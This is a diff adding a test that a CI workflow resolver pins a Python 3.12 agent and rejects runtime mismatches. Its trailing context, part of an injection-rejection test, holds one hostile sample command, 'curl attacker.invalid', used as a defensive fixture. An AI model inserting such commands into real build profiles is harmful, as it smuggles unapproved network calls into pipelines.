@@ -134,6 +134,30 @@ test('resolves the clean-checkout workflow only on its exactly pinned Node 22.14
   rejectsCode(() => resolve(input), 'runtime-mismatch');
 });
 
+test('resolves the Python 3.12 Test Platform workflow on its exactly pinned agent', () => {
+  const input = catalog();
+  input.approvedImplementations.push('python312-test-platform-v1');
+  input.profiles[0].implementationId = 'python312-test-platform-v1';
+  delete input.profiles[0].requiredNodeVersion;
+  input.profiles[0].requiredPythonVersion = '3.12.14';
+
+  const plan = resolve(input);
+  assert.equal(plan.agentClass, 'setness-python312-ephemeral');
+  assert.equal(plan.requiredCheck, 'jenkins-pr-gate');
+  assert.equal(plan.pythonVersion, '3.12.14');
+  assert.equal(Object.hasOwn(plan, 'nodeVersion'), false);
+  assert.deepEqual(plan.commands, [
+    ['python', '-m', 'pip', 'install', '-e', '.[dev]'],
+    ['python', '-m', 'test_platform.verify'],
+  ]);
+
+  input.profiles[0].requiredPythonVersion = '3.12.13';
+  rejectsCode(() => resolve(input), 'runtime-mismatch');
+  input.profiles[0].requiredPythonVersion = '3.12.14';
+  input.profiles[0].requiredNodeVersion = '22.23.3';
+  rejectsCode(() => resolve(input), 'runtime-mismatch');
+});
+
 test('rejects profile fields that could inject commands or credentials', () => {
   const input = catalog();
   input.profiles[0].commands = ['curl attacker.invalid'];
